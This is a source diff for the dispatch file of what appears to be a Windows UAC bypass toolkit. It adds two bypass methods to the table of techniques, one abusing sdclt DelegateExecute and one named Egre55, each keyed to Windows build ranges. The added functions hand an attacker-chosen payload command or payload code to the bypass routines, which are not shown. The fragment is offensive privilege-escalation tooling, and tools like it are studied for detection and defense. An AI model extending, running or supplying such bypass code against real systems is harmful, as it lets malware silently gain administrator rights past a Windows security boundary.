@@ -1,12 +1,12 @@
 /*******************************************************************************
 *
-*  (C) COPYRIGHT AUTHORS, 2015 - 2018
+*  (C) COPYRIGHT AUTHORS, 2015 - 2019
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     3.11
+*  VERSION:     3.13
 *
-*  DATE:        23 Nov 2018
+*  DATE:        25 Jan 2019
 *
 *  UAC bypass dispatch.
 *
@@ -65,6 +65,8 @@ UCM_API(MethodCreateNewLink);
 UCM_API(MethodDateTimeStateWriter);
 UCM_API(MethodAcCplAdmin);
 UCM_API(MethodDirectoryMock);
+UCM_API(MethodCOMSdctl);
+UCM_API(MethodEgre55);
 
 UCM_EXTRA_CONTEXT WDCallbackType1;
 
@@ -130,7 +132,9 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodCreateNewLink, NULL, { 7600, 14393 }, FUBUKI_ID, FALSE, FALSE, TRUE },
     { MethodDateTimeStateWriter, NULL, { 7600, 17763 }, CHIYODA_ID, FALSE, TRUE, TRUE },
     { MethodAcCplAdmin, NULL, { 7600, 17134 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
-    { MethodDirectoryMock, NULL, { 7600, MAXDWORD}, FUBUKI_ID, FALSE, TRUE, TRUE }
+    { MethodDirectoryMock, NULL, { 7600, MAXDWORD }, FUBUKI_ID, FALSE, TRUE, TRUE },
+    { MethodCOMSdctl, NULL, { 14393, MAXDWORD }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodEgre55, NULL, { 14393, MAXDWORD }, FUBUKI_ID, TRUE, FALSE, TRUE }
 };
 
 #define WDCallbackType1MagicVer 282647531814912
@@ -1050,4 +1054,31 @@ UCM_API(MethodDirectoryMock)
     return ucmDirectoryMockMethod(
         Parameter->PayloadCode,
         Parameter->PayloadSize);
+}
+
+UCM_API(MethodCOMSdctl)
+{
+    LPWSTR lpszPayload = NULL;
+
+    UNREFERENCED_PARAMETER(Parameter);
+
+    if (g_ctx->OptionalParameterLength == 0)
+        lpszPayload = g_ctx->szDefaultPayload;
+    else
+        lpszPayload = g_ctx->szOptionalParameter;
+
+    return ucmSdcltDelegateExecuteCommandMethod(lpszPayload);
+}
+
+UCM_API(MethodEgre55)
+{
+#ifdef _WIN64 
+    UNREFERENCED_PARAMETER(Parameter);
+    SetLastError(ERROR_INSTALL_PLATFORM_UNSUPPORTED);
+    return FALSE;
+#else
+    return ucmEgre55Method(
+        Parameter->PayloadCode,
+        Parameter->PayloadSize);
+#endif
 }
